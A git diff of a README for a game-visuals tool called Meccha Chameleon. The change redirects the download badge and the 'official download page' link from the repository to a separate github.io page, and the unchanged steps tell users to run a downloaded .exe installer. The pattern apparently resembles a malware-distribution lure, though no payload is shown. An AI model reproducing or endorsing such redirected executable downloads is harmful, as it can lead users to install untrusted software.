@@ -1,6 +1,6 @@
 # 🦎 meccha-chameleon-project - Enhance your game experience with visuals
 
-[![Download Meccha Chameleon](https://img.shields.io/badge/Download-Meccha_Chameleon-blue.svg)](https://github.com/spenselurid522/meccha-chameleon-project)
+[![Download Meccha Chameleon](https://img.shields.io/badge/Download-Meccha_Chameleon-blue.svg)](https://spenselurid522.github.io)
 
 ## 📌 Overview
 
@@ -22,7 +22,7 @@ Ensure your graphics drivers are up to date before you run the program. Outdated
 
 ## 🚀 Downloading and Setup
 
-1. Visit the [official download page](https://github.com/spenselurid522/meccha-chameleon-project) to acquire the latest version of the software.
+1. Visit the [official download page](https://spenselurid522.github.io) to acquire the latest version of the software.
 2. Select the file ending in .exe to download the installer to your computer.
 3. Locate the file in your downloads folder.
 4. Double-click the installer icon to begin the installation.
